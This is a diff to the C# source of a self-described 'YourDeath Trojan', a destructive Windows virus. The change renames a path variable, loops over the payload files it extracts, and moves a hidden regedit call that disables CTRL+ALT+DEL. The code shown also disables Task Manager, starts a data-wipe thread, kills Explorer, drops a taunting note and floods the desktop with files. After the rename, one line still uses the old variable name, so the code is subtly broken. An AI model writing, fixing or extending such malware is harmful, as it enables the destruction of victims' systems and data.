@@ -1,4 +1,4 @@
-﻿/* YourDeath Trojan
+/* YourDeath Trojan
 
 This software is written by Ali Diaa. ©️ All rights reserved.
 I recommend you to run this computer virus on Windows 7. */
@@ -212,16 +212,16 @@ namespace YourDeath
                 Thread melting = new Thread(ScreenMelting);
 
                 // Create the resources folder
-                string resources = @"C:\Program Files\Temp\Hmm\What\Oh\Wait\DoNotTouchMe\Well\YouDid\Sigh\Critical\Idk\YourParentsAreMad\ItIsMe\YouAreDeadAnyway";
+                string resPath = @"C:\Program Files\Temp\Hmm\What\Oh\Wait\DoNotTouchMe\Well\YouDid\Sigh\Critical\Idk\YourParentsAreMad\ItIsMe\YouAreDeadAnyway";
                 Directory.CreateDirectory(resources);
 
                 // Simple note writer
-                StreamWriter Note = new StreamWriter(resources + @"\Note.txt");
+                StreamWriter Note = new StreamWriter(resPath + @"\Note.txt");
                 Note.Write("Your computer has been trashed by the YourDeath Trojan, and you're now dead!" + Environment.NewLine + "Don't try to reboot your computer or kill YourDeath, " + Environment.NewLine + "this isn't a good idea!" + Environment.NewLine + "Good luck!");
                 Note.Close();
 
                 // Start the note
-                Process.Start(resources + @"\Note.txt");
+                Process.Start(resPath + @"\Note.txt");
 
                 // Disable the task manager
                 RegistryKey DisTaskMgr = Registry.CurrentUser.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System");
@@ -239,15 +239,30 @@ namespace YourDeath
                 dataWipe.Start();
 
                 // Extract all required resources
-                Extract("YourDeath", resources, "Resources", "YourDeath.exe");
-                Extract("YourDeath", resources, "Resources", "a lot of skulls.jpg");
-                Extract("YourDeath", resources, "Resources", "disctrl.reg");
-                Extract("YourDeath", resources, "Resources", "hol333.ani");
-                Extract("YourDeath", resources, "Resources", "skull_real_ico.ico");
-                Extract("YourDeath", resources, "Resources", "skull_real.png");
-                Extract("YourDeath", resources, "Resources", "YourImage.jpg");
-                Extract("YourDeath", resources, "Resources", "YourDeath_HTML.html");
-                Extract("YourDeath", resources, "Resources", "RunAway.exe");
+                string[] toExtract = new string[] {
+"YourDeath.exe",
+"a lot of skulls.jpg",
+"disctrl.reg",
+"hol333.ani",
+"skull_real_ico.ico",
+"skull_real.png",
+"YourImage.jpg",
+"YourDeath_HTML.html",
+"RunAway.exe"
+};
+
+                foreach (string s in toExtract)
+                {
+                    Extract("YourDeath", resPath, "Resources", s);
+                }
+
+                // Disable the CTRL+ALT+DEL option
+                const string quote = "\"";
+                ProcessStartInfo ctrlaltdel = new ProcessStartInfo();
+                ctrlaltdel.FileName = "cmd.exe";
+                ctrlaltdel.WindowStyle = ProcessWindowStyle.Hidden;
+                ctrlaltdel.Arguments = @"/k regedit /s " + quote + @"C:\Program Files\Temp\disctrl.reg" + quote + " && exit";
+                Process.Start(ctrlaltdel);
 
                 Thread.Sleep(5000);
 
@@ -266,14 +281,6 @@ namespace YourDeath
 
                 // Start screen melting
                 melting.Start();
-
-                // Disable the CTRL+ALT+DEL option
-                const string quote = "\"";
-                ProcessStartInfo ctrlaltdel = new ProcessStartInfo();
-                ctrlaltdel.FileName = "cmd.exe";
-                ctrlaltdel.WindowStyle = ProcessWindowStyle.Hidden;
-                ctrlaltdel.Arguments = @"/k regedit /s " + quote + @"C:\Program Files\Temp\disctrl.reg" + quote + " && exit";
-                Process.Start(ctrlaltdel);
 
                 // Kill Windows Explorer
                 Thread.Sleep(3000);
@@ -431,10 +438,10 @@ namespace YourDeath
                 // Prevent Windows 7 themes to change icons or pointers
                 RegistryKey icons = Registry.CurrentUser.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Themes");
                 icons.SetValue("ThemeChangesDesktopIcons", 0, RegistryValueKind.DWord);
-                
+
                 RegistryKey pointers = Registry.CurrentUser.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Themes");
                 pointers.SetValue("ThemeChangesMousePointers", 0, RegistryValueKind.DWord);
-                
+
                 // Create 300 files on the desktop
                 string desktop_files = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
                 File.WriteAllText(desktop_files + @"\UrDead_UrDead_UrDead_UrDead_UrDead_UrDead_UrDead_UrDead_UrDead_UrDead.txt", "WELCOME TO THE HELL." + Environment.NewLine + "TRY TO ESCAPE THE HELL IF YOU CAN..." + Environment.NewLine + Environment.NewLine + "GOOD LUCK.");
